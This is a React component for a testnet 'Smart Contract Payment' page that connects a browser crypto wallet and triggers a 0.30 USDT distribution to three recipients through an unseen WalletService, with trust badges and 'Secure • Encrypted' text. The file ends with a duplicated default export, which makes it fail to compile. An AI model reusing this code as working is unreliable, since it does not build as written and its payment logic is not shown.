import React, { useState, useEffect } from 'react';
import { Toaster } from 'react-hot-toast';
import toast from 'react-hot-toast';
import { DollarSign } from 'lucide-react';
import { WalletService } from './services/walletService';
import { WalletState, TransactionState } from './types/wallet';
import { TrustIndicators } from './components/TrustIndicators';
import { WalletSelector } from './components/WalletSelector';
import { WalletInfo } from './components/WalletInfo';
import { PaymentSection } from './components/PaymentSection';

function App() {
  const [wallets, setWallets] = useState(WalletService.getInstance().detectWallets());
  const [isConnecting, setIsConnecting] = useState(false);
  const [walletState, setWalletState] = useState<WalletState>({
    isConnected: false,
    address: null,
    chainId: null,
    balance: '0.00',
    usdtBalance: '0.00',
    walletName: null,
  });
  const [transactionState, setTransactionState] = useState<TransactionState>({
    isProcessing: false,
    hash: null,
    status: 'idle',
    error: null,
    distributionSteps: [],
  });

  useEffect(() => {
    // Re-detect wallets periodically in case they get installed
    const interval = setInterval(() => {
      setWallets(WalletService.getInstance().detectWallets());
    }, 2000);

    return () => clearInterval(interval);
  }, []);

  const handleConnectWallet = async (provider: any) => {
    setIsConnecting(true);
    try {
      const walletService = WalletService.getInstance();
      const newWalletState = await walletService.connectWallet(provider);
      setWalletState(newWalletState);
      toast.success(`Connected to ${newWalletState.walletName}`);
    } catch (error: any) {
      console.error('Wallet connection error:', error);
      toast.error(error.message || 'Failed to connect wallet');
    } finally {
      setIsConnecting(false);
    }
  };

  const handleDisconnectWallet = () => {
    WalletService.getInstance().disconnect();
    setWalletState({
      isConnected: false,
      address: null,
      chainId: null,
      balance: '0.00',
      usdtBalance: '0.00',
      walletName: null,
    });
    setTransactionState({
      isProcessing: false,
      hash: null,
      status: 'idle',
      error: null,
      distributionSteps: [],
    });
    toast.success('Wallet disconnected');
  };

  const handlePayment = async () => {
    if (!walletState.isConnected) {
      toast.error('Please connect your wallet first');
      return;
    }

    setTransactionState({
      isProcessing: true,
      hash: null,
      status: 'pending',
      error: null,
      distributionSteps: [],
    });

    try {
      const walletService = WalletService.getInstance();
      
      toast.loading('Processing USDT distribution...');
      
      // Execute the USDT distribution following your script pattern
      const result = await walletService.executeUSDTDistribution();
      
      setTransactionState({
        isProcessing: false,
        hash: result.hash,
        status: 'success',
        error: null,
        distributionSteps: result.steps,
      });

      toast.dismiss();
      toast.success('USDT distribution successful!');

      // Update balances after successful distribution
      setTimeout(async () => {
        try {
          const newBalance = await walletService.getBNBBalance(walletState.address!);
          const newUsdtBalance = await walletService.getUSDTBalance(walletState.address!);
          setWalletState(prev => ({
            ...prev,
            balance: newBalance,
            usdtBalance: newUsdtBalance,
          }));
        } catch (error) {
          console.error('Failed to update balances:', error);
        }
      }, 5000);

    } catch (error: any) {
      console.error('Payment error:', error);
      
      setTransactionState({
        isProcessing: false,
        hash: null,
        status: 'error',
        error: error.message || 'Payment failed',
        distributionSteps: [],
      });

      toast.dismiss();
      toast.error(error.message || 'Distribution failed');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-900 via-purple-900 to-indigo-900">
      <Toaster 
        position="top-right"
        toastOptions={{
          style: {
            background: '#1f2937',
            color: '#f9fafb',
            border: '1px solid #374151',
          },
        }}
      />
      
      <div className="container mx-auto px-4 py-8 max-w-4xl">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="flex items-center justify-center space-x-3 mb-4">
            <DollarSign className="w-8 h-8 text-green-400" />
            <h1 className="text-4xl font-bold text-white">Smart Contract Payment</h1>
          </div>
          <div className="bg-white/10 backdrop-blur-sm rounded-lg p-4 inline-block border border-white/20">
            <p className="text-2xl font-bold text-green-400">Total Distribution: 0.30 USDT</p>
            <p className="text-sm text-gray-300 mt-1">(Distributed to 3 recipients via smart contract)</p>
          </div>
        </div>

        {/* Trust Indicators */}
        <TrustIndicators />

        <div className="space-y-8">
          {/* Wallet Connection */}
          {!walletState.isConnected ? (
            <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-white/10">
              <WalletSelector
                wallets={wallets}
                onConnect={handleConnectWallet}
                isConnecting={isConnecting}
              />
            </div>
          ) : (
            <>
              {/* Wallet Info */}
              <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-white/10">
                <WalletInfo
                  wallet={walletState}
                  onDisconnect={handleDisconnectWallet}
                />
              </div>

              {/* Payment Section */}
              <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-white/10">
                <PaymentSection
                  onPayment={handlePayment}
                  transaction={transactionState}
                  distributionSteps={transactionState.distributionSteps}
                />
              </div>
            </>
          )}
        </div>

        {/* Footer */}
        <div className="text-center mt-12 text-gray-400">
          <p className="text-sm">
            This is a testnet environment. No real funds are involved.
            <br />
            BNB Smart Chain Testnet • USDT Distribution • Secure • Encrypted
          </p>
        </div>
      </div>
    </div>
  );
}

export default App;

export default App